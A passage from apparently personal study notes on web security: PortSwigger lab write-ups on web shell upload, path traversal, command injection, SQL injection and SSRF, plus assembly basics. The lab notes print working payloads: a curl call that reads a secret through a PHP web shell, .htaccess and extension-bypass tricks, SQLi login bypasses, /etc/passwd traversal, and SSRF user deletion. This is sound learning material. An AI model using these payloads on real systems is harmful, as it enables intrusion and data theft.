uploads it to files/avatars/mal.php, which means that it’s cutting traversals in path.\nSo all I had to do was obfuscating the path traversal to ..%2Fmal.php which is same as ../mal.php.\nafter changing a filename to this parameter and uploading it we get the following response\nso the file is uploaded to files/mal.php\nnow we can just call this script using [[1a1b - cURL|cURL]] to get the response\ncurl -X GET \"https://0a3c00e4049c901c802ee994009d003a.web-security-academy.net/files/mal.php?command=cat%20/home/carlos/secret\" jziR****************************jziR**************************** The secret: jziR****************************\nAnother obvious way to prevent users from uploading certain files is to blacklist these file extensions like php. This practice is still flawed since its difficult to explicitly blacklist every file that can be executed. such blacklists can be sometimes bypassed using lesser known, alternative file extensions like .php5 or .shtml and so on.\nAs previously mentioned, some servers won’t let certain files to execute unless they are explicitly configured to do that.\nAs an example, before Apache server lets PHP files to execute, a developer might put something like the following in their /etc/apache2/apache2.conf file:\nLoadModule php_module /usr/lib/apache2/modules/libphp.so AddType application/x-httpd-php .php Many servers also allow developers to create special config-files within individual directories to override global configuration parameters. Apache-specific servers for example will load directory-specific configuration from a file called .htaccess.\nSimilarly, directory-specific configuration can be made on IIS server using web.config file. This might include directives such as the following, where server only allows JSON files to be served to users:\nWeb servers use these kinds of configuration files when present, but you’re not normally allowed to access them using HTTP requests.\nHowever, you may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable type."},"title":"1f3 - Web shell upload via Path Traversal \\[PortSwigger Lab]"},"/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f4-web-shell-upload-via-extension-blacklist-bypass-portswigger-lab/":{"data":{"":"This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.\nTo solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret.\nYou can log in to your own account using the following credentials: wiener:peter\nSolution:\nSo once again User’s page has an avatar upload function which uploads an image at /files/avatars directory.\nUploading mal.php file gives out an error Sorry, php files are not allowed Sorry, there was an error uploading your file.\nThis means that in the server configuration php file extension uploads are blocked.\ntrying to upload a mal.php file shows in Burp Proxy HTTP History that we are talking to an Apache server. Which means there’s a top-level .htaccess and we can override it with directory-specific one.\nso what I did was uploaded an .htaccess file to default location with following contents:\nAddType application/x-httpd-php .hack\nwhere we are giving directory permission to execute php files with an arbitrary extension .hack.\nOnce uploaded we can call it using cURl and retrieve data.\ncurl -X GET \"https://0ab9001703efe22d847cce3d003a000a.web-security-academy.net/files/avatars/mal.hack?command=cat%20/home/carlos/secret\" DTFL****************************DTFL**************************** The secret: DTFL****************************\nBypassing blacklists is also possible using Obfuscating file extensions. For example, if a filename is executable.pHP and the validation code is case-sensitive, then it won’t recognize this as php and let it bypass the defenses.\nSimilar result can be achieved using the following techniques:\nProvide multiple extensions. Depending on how validation happens, it could let in a file like executable.php.jpg. Add additional trailing character like executable.php.. some algorithms just ignore or strip trailing characters Use URL encoding for filenames, dots, forward or backward characters. if the value is not checked during validation, the filename will be interpreted server-side. Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: executable.php;.jpg or executable.php%00.jpg Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like xC0 x2E, xC4 xAE or xC0 xAE may be translated to x2E if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path. Some defenses include stripping or replacing dangerous extensions to prevent it from executing. If this doesn’t happen recursively, you can place the prohibited extension such a way that after it is removed, valid extension will still be left in place. for example:\nexploit.p.**php**hp\nstriping .php from this still leaves valid extension behind."},"title":"1f4 - Web shell upload via extension blacklist bypass \\[PortSwigger Lab]"},"/archive/notetaking-and-random-stuff/thoughts-about-my-cybersec-journey/":{"data":{"":"0a - Thoughts about my Cybersec JourneyOver the years, I have explored diverse disciplines within computer science. My interests have spanned programming, operating systems, and the intricacies of Unix and Windows systems. I delved into game development, experimenting with various engines and libraries, resulting in several completed and unfinished projects that provided valuable experience. Amateur 3D modeling with Blender further broadened my skill set. I consistently engage with technical content, including CS/IT conference recordings. My formal training includes CSIRT and Threat Hunting, and I currently hold a CCNA certification. More recently, I have developed an interest in hardware hacking and IoT, though my electronics knowledge is currently limited. This breadth of experience has provided me with a foundation of knowledge that I believe is sufficient for specializing in any area of cybersecurity.\nSpecifically, in the next period I’d like to improve in the following sub-disciplines(although not necessarily in this order):\nReverse Engineering Bug Bounty Penetration Testing SOC Analysis(maybe)","0a---thoughts-about-my-cybersec-journey#0a - Thoughts about my Cybersec Journey":"","observations#Observations":"date: Sat 22:51 10AUG2024\nI have observed that theoretical learning, such as through passive reading or didactic courses (e.g., HackTheBox Academy lessons), yields minimal practical knowledge retention. Conversely, hands-on experience, gained through practical challenges and labs (e.g., Portswigger Academy, HackTheBox Labs, bug bounty programs), significantly enhances knowledge retention and application. Therefore, I will prioritize practical challenges and adopt a just-in-time learning approach, acquiring knowledge as needed to effectively retain and apply the information."},"title":"thoughts-about-my-cybersec-journey"},"/archive/raw-notes-command-injection/":{"data":{"":"1d - OS command injectionAlso known as shell injection. Allows an attacker to execute operating system commands on the server that is running a web application - typically compromises the application and its data.\nAn attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure and exploit trust relationship to pivot the attack to other systems as well.\nsome informational commands\nPurpose of command Linux Windows Name of current user whoami whoami Operating system uname -a ver Network configuration ifconfig ipconfig /all Network connections netstat -an netstat -an Running processes ps -ef tasklist","1d---os-command-injection#1d - OS command injection":"","an-example#\u003cstrong\u003eAn example\u003c/strong\u003e":"An application allows an user to see whether an item is in stock or not. It’s accessed through a URL:\nhttps://insecure-website.com/stockStatus?productID=381\u0026storeID=29\nTo provide the stock data, the application must query various legacy systems. and because of this, functionality is implemented by calling out to a shell command with the product and store IDs as arguments.\nstockreport.pl 381 29\nThe command outputs the stock status for specified item.\nThe application implements no defense mechanisms against OS injection, so the following command executes an arbitrary command on the system\n\u0026 echo aiwefwlguh \u0026\nsupposing this is in the productID parameter, the command executed by the application would be:\nstockreport.pl \u0026 echo aiwefwlguh \u0026 29\nstockreport.pl - main script that will be running to check stock data \u0026 - shell command separator. used to separate commands to execute one after another echo aiwefwlguh - an argument for productID. prints aiwefwlguh 29 - storeID parameter"},"title":"_index"},"/archive/raw-notes-command-injection/1d1-os-command-injection-simple-case-portswigger-lab/":{"data":{"":"1d1 - OS command injection, simple case [PortSwigger Lab]This lab contains an OS command injection vulnerability in the product stock checker.\nThe application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.\nTo solve the lab, execute the whoami command to determine the name of the current user.","1d1---os-command-injection-simple-case-portswigger-lab#1d1 - OS command injection, simple case [PortSwigger Lab]":"","solution#Solution:":"So we got the application url https://0a1a008c030d74ae82cb6698003a004a.web-security-academy.net/\nOnce again, it has a product page where ‘Check stock’ function is implemented.\nBy checking HTPP request made by that button is as follows\nPOST /product/stock HTTP/2 Host: 0a1a008c030d74ae82cb6698003a004a.web-security-academy.net Cookie: session=SMwTtluydKMmnOH4phL6G00iGAwD2J9Q Content-Length: 21 Sec-Ch-Ua: \"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\" Sec-Ch-Ua-Platform: \"Windows\" Accept-Language: en-US Sec-Ch-Ua-Mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36 Content-Type: application/x-www-form-urlencoded Accept: */* Origin: https://0a1a008c030d74ae82cb6698003a004a.web-security-academy.net Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://0a1a008c030d74ae82cb6698003a004a.web-security-academy.net/product?productId=2 Accept-Encoding: gzip, deflate, br Priority: u=1, i productId=2\u0026storeId=1 on the bottom we got productId=2\u0026storeId=1 which makes a request to an API with these parameters.\nLet’s change productID argument to \u0026 echo hello \u0026 but with url encoding enabled\nThis request gives out the following output ![[Pasted image 20240719183415.png]] although it resulted in error, now we know the username peter-3vyaW3\nor the second way which yields the same response:"},"title":"1d1-os-command-injection-simple-case-portswigger-lab"},"/archive/raw-notes-sqli/":{"data":{"1e---sql-injection#1e - SQL injection":"1e - SQL injectionSQLi is a web security vulnerability that allows an attacker to interfere with the queries that an application makes with its database. This enables to see the sensitive data. In many cases it is also possible to meddle with that data and delete or modify them.\nIt may even enable an attacker to perform either DDOs or compromise who database infrastructure.\nTypically there are manual ways to SQLi vulnerability in an application\nlook for errors or anomalies when using ' Boolean conditions and web applications reaction to it. OR 1=1 and OR 1=2 Payloads designed to trigger time delays within a SQL query. look for time differences OAST payloads deigned to trigger out-of-band network interaction when executed some SQL-specific syntax that returns to original value and to different values Or to find these vulnerabilities automatically, use Burp Scanner.\nAs an example, imagine there is a shopping application that displays products in different categories. When user clicks Gifts category, the browser request a URL:\nhttps://insecure-website.com/products?category=Gifts\nThis causes the application to make a SQL query to retrieve further details about products\nSELECT * FROM products WHERE category = 'Gifts' AND released = 1\nI’m guessing the existence of released=1 implies the existence of released=0, huh?\nThis application doesn’t have a protection mechanisms against SQLi. This means that something like this could be constructed\nhttps://insecure-website.com/products?category=Gifts'--\nwhich would send a following query\nSELECT * FROM products WHERE category = 'Gifts'--' AND released = 1\nwhere -- is a comment indicator in SQL, which means AND released = 1 will be ignored - Therefore, displaying all the data.\nA similar attack:\nhttps://insecure-website.com/products?category=Gifts'+OR+1=1--\nThe SQL query:\nSELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1\nThis query returns all items."},"title":"_index"},"/archive/raw-notes-sqli/1e1-sql-injection-vulnerability-allowing-retrieval-of-hidden-data-portswigger-lab/":{"data":{"":"1e1 - SQL injection vulnerability allowing retrieval of hidden data [PortSwigger Lab]This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:\nSELECT * FROM products WHERE category = 'Gifts' AND released = 1\nTo solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.","1e1---sql-injection-vulnerability-allowing-retrieval-of-hidden-data-portswigger-lab#1e1 - SQL injection vulnerability allowing retrieval of hidden data [PortSwigger Lab]":"","solution#Solution:":"So taking this application into BurpSuite and selecting a category “Pets” gives me the following request\nGET /filter?category=Pets HTTP/2\nSo what should I inject here to cause the following SQL query to malfunction?\nSELECT * FROM products WHERE category = 'Pets' AND released = 1\nSo basically, modifying the original GET /filter?category=Pets HTTP/2 to GET /filter?category=Pets'+OR+1=1--' HTTP/2 causes to perform the following SQL query\nSELECT * FROM products WHERE category = 'Pets' OR 1=1-- AND released = 1\nmeaning that everything will be displayed since 1=1 is TRUE and after that everything is ignored.\nImagine another scenario where an application lets user submit their credentials wiener:peter. SQL query might look like this\nSELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'\nif the query returns the details the login was seccessful. otherwise, it rejected.\nan attacker might be able to login as any user without the need for a password. this can be done using -- sequence in WHERE clause where password is checked. for example submitting the username wiener'-- would produce the following SQL query\nSELECT * FROM users WHERE username = 'wiener'--' AND password = ''\nsuccessfully logging in a user."},"title":"1e1-sql-injection-vulnerability-allowing-retrieval-of-hidden-data-portswigger-lab"},"/archive/raw-notes-sqli/1e2-sql-injection-vulnerability-allowing-login-bypass-portswigger-lab/":{"data":{"":"1e2 - SQL injection vulnerability allowing login bypass [PortSwigger Lab]This lab contains a SQL injection vulnerability in the login function.\nTo solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.","1e2---sql-injection-vulnerability-allowing-login-bypass-portswigger-lab#1e2 - SQL injection vulnerability allowing login bypass [PortSwigger Lab]":"","solution#Solution:":"So basically moving to login page and making a request with random credentials e.g administrator:1234 produces the following request\ncsrf=fa4Q5v3cgV1j8b53G5zEr6Q45BQUFKfA\u0026username=administrator\u0026password=1234\nall we need to do is add '-- after administrator. which successfully lets us in as an administrator.\nI’ve solved around 20 PortSwigger labs at the time of writing. So the things I’ve further learned is mainly related to BurpSuite. so having a good knowledge of that is essential.\nI’ve got a fairly good grasp of Access Control vulnerabilities at this point."},"title":"1e2-sql-injection-vulnerability-allowing-login-bypass-portswigger-lab"},"/archive/raw-notes-ssrf/":{"data":{"":"1c - Server-Side Vulnerabilities","1c---server-side-vulnerabilities#1c - Server-Side Vulnerabilities":"","access-control#Access Control":"Access control is the system of constraints on who or what is authorized to perform actions or access resources. Access Control is dependent on authentication and session management:\nAuthentication confirms that the user is who they say they are Session Management identifies which subsequent HTTP requests are made by the same user Access Control Determines whether the user is allowed to carry out an action or access a resource Broken Access Control is a common and often critical vulnerability since access control [[1a2a - OWASP TOP 10 2021#4. Insecure Design| design decisions]] have to be made by humans, so the potential for errors is high.","authentication-vulnerabilities#Authentication vulnerabilities":"easy to understand critical relationship between authentication and security Authentication Authorization process of verifying that a\nuser is who they claim to be\nAuthorization involves verifying\nwhether a user is allowed to do something","brute-force-attacks#Brute-Force Attacks":"Websites that use solely password protection, are highly vulnerable to brute-forcing attacks.\nbrute-forcing need not be based only on random guessing. But also using basic logic, publicly available knowledge and fine-tuned-dictionaries.\nUsernames are especially easy to guess since they usually follow a certain pattern. For example a business email might look like this firstname.lastname@somecompany.com. sometimes even-high privileged accounts are created certain usernames. such as admin or administrator.\nHTTP responses sometimes disclose email addresses of high-privileged users, such as admins or IT support.\nPasswords can be similarly brute-forced, varying the difficulty based on strength of the password. enforcing high-entropy passwords is a good form of password policy - making it harder to guess. enforcing includes:\nA minimum number of characters A mixture of lower and uppercase letters At east one special character high-entropy passwords might be hard to crack, but humans generally follow a certain pattern or knowledge when creating password - often creating a password they can remember - familiar information about a person helps guessing what their credentials might be.\nUsername Enumeration is when an attacker is able to identify whether an username is valid or not based on the changes in the website(on a login page for example.) this makes generating a possible wordlist easier.\nAlright, so from the Portswigger Academy lab, I learned how to enumerate usernames and brute-force passwords.\ninput the website url add username and password variables in BurpSuite Intruder in response like username=$user$password=anything add grep catch for “incorrect username” or something that can identify incorrect usernames run intruder check for different response or status codes same thing for passwords","bypassing-two-factor-authentication#Bypassing two-factor authentication":"sometimes, two-factor authentication is so flawed, it can be bypassed entirely. Meaning, if the user is logged in and is prompted to enter a verification code, the user in effectively in a “logged in” state already. In this case, you can test if you can skip to “logged-in only” pages after first step of auth. sometimes websites don’t check for verification step.","horizontal-privilege-escalation#Horizontal Privilege Escalation":"Horizontal Privilege Escalation occurs when an user is able to access other user’s resources. It is similar to exploit methods used for Vertical Privilege Escalation.\nhttps://insecure-website.com/myaccount?id=123\\\nModifying id variable will grant access to other account. This is an example of Insecure Direct Object Reference(IDOR) vulnerability. This happens when user-controlled parameters are used to access resources or functions directly.\nIn other cases Globally Unique Identifiers(GUIDs) may be used which is harder to predict. However, these values can be disclosed in some other location. Example of GUID:\n/my-account?id=7340df82-31d9-4882-a087-ed4a3a7e4b59\nBy changing GUID, an attacker could access other accounts in the same manner as with just id.","horizontal-to-vertical-privilege-escalation#Horizontal to Vertical privilege escalation":"a horizontal privilege escalation can be turned to vertical if an attacker can escalate privileges by gaining access to more privileged user, such as an administrator. An example:\n1. http://insecure-website.com/myaccount?id=wiener 2. http://insecure-website.com/myaccount?id=administrator -\u003e on the administrator page","parameter-based-access-control-methods#Parameter-based access control methods":"In some cases applications determine user access rights and details at login, and then store them in user-controllable storages:\nA hidden fields forgeable cookies(stored on client-side, probably) query parameters For example: https://insecure-website.com/login/home.jsp?admin=true https://insecure-website.com/login/home.jsp?role=1","path-traversal#Path Traversal":"Also known as directory traversal. this type of vulnerabilities enable an attacker to read files on the server including:\nApplication code and data Credentials sensitive files In some cases, an attacker might also be able to write files.\nSupposing we got image tag on a website:\nthe loadImage URL takes a filename parameter with an image path and it doesn’t check for path traversal vulnerability, so a following could be done to retrieve other information.\nthe 218.png is appended to /var/www/images/218.png. we can traverse up a directory using '../' and reach /etc/passwdlike so: https://insecure-website.com/loadImage?filename=../../../etc/passwd\nIn many cases where user input is used for file paths, there are usually defense mechanisms in place, which can be often bypassed.\nIn case these defense mechanisms block absolute paths, there might be a way to overcome them. such as using nested traversal paths ....// or ....\\/\nsometimes when multipart/form-data requests are made, URL is stripped of any path traversal inputs. so the way to overcome them might be to use URL encoded character, ../ turns to %2e%2e%2f and so on. You may need to encode URL twice - If an application decodes it once second one will pass the defenses.\nAn application might also require a user supplied file extension such as .png. In this case it might be possible to use a null byte to ignore characters after it. like so - filename=../../../etc/passwd%00.png\nThe most effective way to prevent path traversal attacks is to just avoid user-supplied paths.\nIn case it cannot be avoided, implement 2-way defense mechanism\nValidate user input Append the file path to base directory","server-side-request-forgery-ssrf#Server-side request forgery (SSRF)":"Against local systems\nSSRF is a web security vulnerability that allows an attacker to make requests to an unintended location.\nIn a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization’s infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems. This could leak sensitive data, such as authorization credentials.\nIn a SSRF attack against a server, the attacker causes the application to make a HTTP request back to the host server, via its loopback interface, typically 127.0.0.1 or localhost.\nFor example, in a shopping application scenario, user wants to know if a product is in stock, so the browser sends a request through front-end like the following to the back-end API endpoint:\nPOST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1 This, in turn causes the server to make a request to a back-end url, effectively retrieving stock status and returning to the user.\nThe following is a modified HTTP request:\nPOST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://localhost/admin This fetches the contents of the /admin URL and returns it to the user. Usually, administrative functionality is only available through authenticated users. so the only way of having such access to the system, would be to access /admin page through local machine - or an [[1a1b - cURL#cURL COOKIES |imitated]] one.\nThis kind of behavior for SSRF to work is possible due to:\nThe access control check is implemented on the front-end, so upon making a request, it can bypass a back-end For disaster recovery purposes, the application might allow administrative access without login from local machine - kind of a way for an admin to recover the system without credentials. Admin interface is listening on different port, and is not accessible from userspace. Generally, security measures based on trust allow requests to be handled differently, often makes SSRF into a critical vulnerability.","vertical-privilege-escalation#\u003cstrong\u003eVertical privilege escalation\u003c/strong\u003e":"if a user can gain access to functionality that they are not permitted to then this is vertical privilege escalation. for example an administrator page from user account. it might be disclosed in robots.txt file or can even be brute-forced through Ffuf or dirb for example.\nIn some cases, sensitive functionality such as /administrator-panel is concealed with less predictable URL(Security by obscurity) such as: https://insecure-website.com/administrator-panel-yb556. However, this could be still discovered using URL leaks in code, which can be commonly viewed using ctrl + u."},"title":"_index"},"/archive/raw-notes-ssrf/1c1-ssrf-against-local-interface-portswigger-lab/":{"data":{"":"1c1 - SSRF against local interface [Portswigger Lab]","1c1---ssrf-against-local-interface-portswigger-lab#1c1 - SSRF against local interface [Portswigger Lab]":"","problem#\u003cstrong\u003eProblem\u003c/strong\u003e":"This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`. URL: https://0a4f00b403f04c6c8165a70d000b0073.web-security-academy.net/","solution#Solution":"So each product page has a functionality to check stock for an item. Clicking “Check stock” displays number of items in stock\nUpon checking in BurpSuite, the application makes an API call to some stockApi URL Changing a stockApi URL to a loopback URL such as http://localhost/admin and then sending a request causes the web application to return an admin interface instead of number of stock items.\nPointing to User delete link points to https://0a4f00b403f04c6c8165a70d000b0073.web-security-academy.net/admin/delete?username=wiener, so if we modify the HTTP request once again to stockApi=http://localhost/admin/delete?username=wiener it will make a SSRF call against the local server and issue a command to delete an user ‘wiener’"},"title":"1c1-ssrf-against-local-interface-portswigger-lab"},"/archive/raw-notes-ssrf/1c2-ssrf-against-external-back-end-system-portswigger-lab/":{"data":{"1c2---ssrf-against-external-back-end-system-portswigger-lab#1c2 - SSRF against external back-end system [PortSwigger Lab]":"1c2 - SSRF against external back-end system [PortSwigger Lab]The same principle applies for remote SSRF. An attacker can submit the following request to access the admin interface\nPOST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://192.168.0.68/admin The same example as previous, but for remote API:\na Webapplication makes a request for stock check at http://192.168.0.1:8080/product/stock/check?productId=1\u0026storeId=1\nwe know that API is in this range http://192.168.0.X:8080\nso to find it we use BurpSuite Intruder\nmake payloads 1-254 run Start Attack wait for status code 200 http://192.168.0.30:8080/admin change request header upon clicking Check Stock to stockApi=http://192.168.0.30/admin admin panel opens up make request again stockApi=http://192.168.0.30/admin/delete?username=carlos send done"},"title":"1c2-ssrf-against-external-back-end-system-portswigger-lab"},"/archive/reverse-engineering-and-binary-exploitation/":{"data":{"-reverse-engineering--binary-exploitation#🕷️ Reverse Engineering \u0026amp; Binary Exploitation":"🕷️ Reverse Engineering \u0026 Binary ExploitationIn this section, I’ll document my ongoing discoveries and learning journey in the realms of reverse engineering techniques, binary exploitation, and malware analysis. This space will serve as a practical log of my hands-on experiences, code snippets, and methodical approaches to understanding these cybersecurity disciplines from their foundational levels"},"title":"_index"},"/archive/reverse-engineering-and-binary-exploitation/assembly-basics/":{"data":{"":"","-assembly-basics#🔤 Assembly Basics":"","arithmetic-instructions#Arithmetic Instructions":"Arithmetic instructions are split in Unary and Binary operands.","assembly#Assembly":"Assembly language at its basic is an symbolic language that directly ties a language machine can understand and a language that is easy for humans to understand.\nAn instruction like add rax, 1 is simpler than machine shellcode equivalent 4883C001 or binary machine code 01001000 10000011 11000000 00000001\nThere are different processor architectures and each needs a program to be written on different sets of instructions. This is where low-level languages like C come in.\nC has a complier that compiles a source code to a variety of architectures without writing different source code for each.","assembly-basic-instructions#Assembly basic instructions":"","assembly-file-structure#Assembly File Structure":"global _start section .data message: db \"Hello\" section .text _start: mov rax, 1 mov rdi, 1 mov rsi, message mov rdx, 18 syscall mov rax, 60 mov rdi, 0 syscall In the example above we have\nSection Explanation global _start This is a directive for the code to start executing at the _start label defined below section .data This is a data section, which should contain all of the variables section .text This is a text section containing all of the code that should be executed","binary#Binary":"Binary instruction, namely takes two arguments\nInstruction Explanation Example add Add both operands add rax, rbx sub Subtract Source from Destination rax = rax - rbx sub rax, rbx imul Multiply both operands imul rax, rbx result is always stored in the destination register. source stays intact.","bitwise#Bitwise":"Bitwise instructions work on the bit level\nInstruction Explanation Example not Bitwise NOT(inverts all bits) not rax and Bitwise AND(if both bits are 1 -\u003e 1, if both 0 -\u003e 0) and rax, rbx or Bitwise OR(if either is 1-\u003e1, if both 0-\u003e0) or rax, rbx xor Bitwise XOR(if bits are the same -\u003e 0. if different -\u003e 1) xor rax, rbx global _start section .text _start: xor rax, rax ; 0 xor rbx, rbx; 0 add rbx, 15; rbx = 0x0F xor rbx, 15; 0","branching#Branching":"Branching allows jump-ing to any location in the program if a condition is met. The most basic branching instruction is jmp which will always be triggered no matter the conditions.\nAn example\nglobal _start section .text _start: xor rax, rax ; initialize rax to 0 xor rbx, rbx ; initialize rbx to 0 inc rbx ; increment rbx to 1 mov rcx, 10 loopFib: add rax, rbx ; get the next number xchg rax, rbx ; swap values jmp loopFib In this example, even though mov rcx, 10 is present, it won’t affect jmp loopFib because jmp is an unconditional instruction and will continue running the loop forever.","cache#Cache":"Cache memory resides withing the CPU and is extremely fast compared to RAM as it runs on the same clock speed. However it is very limited in size and memory.\nThere are three levels of cache memory, sorted by their physical closeness to CPU\nLevel Explanation Level 1 Cache Usually in kilobytes, the fastest memory available, located in each CPU core. (Only registers are faster.) Level 2 Cache Usually in megabytes, extremely fast (but slower than L1), shared between all CPU cores. Level 3 Cache Usually in megabytes (larger than L2), faster than RAM but slower than L1/L2. (Not all CPUs use L3.)","code#Code":".text section holds all assembly instructions and loads them to the text memory segment. Once all instructions are loaded, then the processor starts executing them in order.\nThe text segment within the memory is read-only, so we cannot write any variables within it.\nThe data section is read/write, which is why we write our variables to it.","computer-architecture#Computer Architecture":"The following is the Von Neumann Architecture of modern computers","conditional-branching#Conditional Branching":"Instruction Explanation jz DST == 0 jnz DST != 0 js DST \u003c 0 jns DST \u003e= 0 jg DST \u003e SRC jge DST \u003e= SRC jl DST \u003c SRC jle DST \u003c= SRC Branching is not only done with jumping. It can also be combined with other instructions like mov with CMOVcc and SETcc. An example of mov rax, rbx but on the condition of == 0 cmovz rax, rbx Similarly for \u003c cmovl rax, rbx\nSimilarly for set setz rax","cpu-architecture#CPU Architecture":"CPU is the main processing unit within a computer. The CPU contains the Control Unit(CU), which is in charge of moving and controlling data and there’s Arithmetic/Logic Unit(ALU), which is in charge of performing arithmetic and logical calculations as requested.\nEfficiency of a CPU and which instructions it can run depends on its Instruction Set Architecture(ISA). RISC architecture is based on processing more simple instructions, which takes more cycles but each cycle is shorter and takes less power. CISC architecture is based on processing fewer, more complex instructions, which takes less instructions and fewer cycles but each instruction takes more time and power.\nA clock speed refers to each tick given one cycle of an operation that it takes to process a basic instruction, like fetching an address or storing one.\nThe frequency of cycles is measured in Hertz. Example: CPU speed with 2.0GHz means that it can run 2 billion cycles every second(per core).","data-types#Data Types":"x86 architecture supports several data types\nData type Length byte 8 bits word 16 bits dword 32 bits qword 64 bits","description-because-to-build-a-house-you-must-first-lay-its-foundation#description: \u0026hellip;because to build a house, you must first lay its foundation.":"","directives#Directives":"An assembly code runs line-by-line. Directives like global _start indicates the machine where to start processing instructions. So, the machine goes to the _start label and starts executing the instructions there.","endianness#Endianness":"An address endianness is the order of its bytes in which they are stored or retrieved from memory. There are two types of endianness: Little-Endian and Big-Endian. With Little-Endian processors, the little-end byte of the address is retrieved right-to-left Example: an address 0x0011223344556677 will be stored in reverse -\u003e 0x7766554433221100\nWith Big-Endian processors, the big-end byte is retrieved left-to-right\nIn little endian, if we were to push an address or a string with Assembly, we would have to push it in reverse. For example, if we want to store the word Hello, we would push its bytes in reverse: o, l, l, e, and finally H.","example-1-moving-data-to-a-register#Example 1: moving data to a register":"global _start section .text _start: mov rax, 0 ; move value 0 to rax mov rbx, 1 ; move value 1 to rbx mov al, 1 ; move 1-byte into a 1-byte register(al) assembling asm.s using nasm nasm -f elf64 asm.s \u0026\u0026 objdump -M intel -d asm.o","example-2-moving-pointer-values#Example 2: moving pointer values":"global _start section .text _start: mov rax, rsp mov rax, [rsp] Square brackets [] tells nasm to move whatever the value is at address rsp to rax","example-3-loading-value-pointers-using-lea#Example 3: Loading value pointers using lea":"global _start section .text _start: lea rax, [rsp+10] ; loads rsp+10 address space to rax mov rax, [rsp+10] ; loads value at rsp+10 address space to rax","functions#Functions":"","instruction-cycle#Instruction Cycle":"An Instruction Cycle is the cycle it takes the CPU to process a single machine instruction It consists of four stages:\n1. Fetch Takes the next instruction’s address from the Instruction Address Register (IAR), which tells it where the next instruction is located. 2. Decode Takes the instruction from the IAR, and decodes it from binary to see what is required to be executed. 3. Execute Fetch instruction operands from register/memory, and process the instruction in the ALU or CU. 4. Store Store the new value in the destination operand. An example: Fetch the instruction from the rip register, 48 83 C0 01 (in binary). Decode 48 83 C0 01 to know it needs to perform an add of 1 to the value at rax. Get the current value at rax (by CU), add 1 to it (by the ALU). Store the new value back to rax. each processor has its own set of instructions and corresponding machine code. So, each processor type has its Instruction Set Architectures, and each architecture can be further represented in several syntax formats","instruction-set-architectures#Instruction Set Architectures":"ISA specifies the syntax and semantics of the assembly language. It consists of\nInstructions - add rax, 1, mov rsp, rax, push rax Registers - rax, rsp, rip Memory Addresses - 0xffffffffaa8a25ff, 0x44d0, $rax Data Types - byte, word, double word There are two main ISA that are used widely:\nCISC - used by Intel and AMD processors RISC - used in ARM and Apple processors, in most smartphones and some laptops","io-storage#I/O Storage":"Input/Output devices are storage unit, keyboard, screen etc. The processor can access and control IO devices using Bus Interfaces. These are metallic ‘highways’ on a PCB that help transmission of electrical charges as binary data.\nEach Bus has a capacity of how much electric charge(or bits) it can carry at a given moment. This is usually a multiple of a nibble(half of a byte) up to 128-bits.\nBus interfaces are used to access memory and components outside the CPU. This is why there are countless bus interfaces around the CPU.\nBy speed here are memory components sorted\nComponent Speed Size Registers Fastest Bytes L1 Cache Fastest, after Registers Kilobytes L2 Cache Fast after L1 Megabytes L3 Cache Slower than all of the above Megabytes RAM Slower than all of the above GB-TB Storage Slowest TB+","loops#Loops":"A loop in assembly is a set of instructions that repeat for rcx times.\nglobal _start section .text _start: xor rax, rax ; rax = 0 xor rbx, rbx ; rbx = 0 inc rbx ; rbx = 1 mov rcx, 10 ; loop 10 times loopFib: add rax, rbx ; get the next number xchg rax, rbx; swap values loop loopFib ; In the example above rcx register in mov rcx, 10 is a general-purpose register, but for loop it has a special purpose.\nloop checks rcx value each time that loop block executes and decreases rcx value each time. This loop runs until rcx is 0.\nHow does loopFib gets executed? loopFib: is just a label which gets translated to an address of add rax, rbx at runtime. While loop loopFib tells assembly where to jump at each iteration. This loop instruction checks that rcx\u003e0 value before executing another loop.","memory#Memory":"Memory is where the temporary data and instructions reside when a program is running/doing calculations. This is the first place a CPU goes to retrieve and process data. Very fast but also volatile\nThere are two types of memory:\nCache Random Access Memory or RAM","memory-addresses#Memory Addresses":"Memory is segmented into memory regions, like the Stack, Heap and other program and kernel-specific regions. Each segment has specific read, write, execute permissions that specifies what can be done in that segment.\nwhenever an instruction is called, the first step is to fetch the instruction from the address it’s located at. Several types of address fetching in x86\nAddressing mode Explanation Example Immediate The value is given withing the instruction add 2 Register The register that holds the value is given to instruction add rax Direct The full address is given in the instruction call 0xffffffffaa8a25ff Indirect A reference pointer is given in the instruction call 0x44d000 or call [rax] Stack Address on top of the stack is passed to the instruction add rsp","moving-data-around#Moving data around":"Data movement is one of the fundamental instructions in any assembly program. The main Data Movement instructions are:\nInstruction Explanation Example mov Move data or load immediate data mov rax, rip lea Load an address pointing to the value lea rax, [rsp+5] xchg Swap data between two registers or addresses xchg 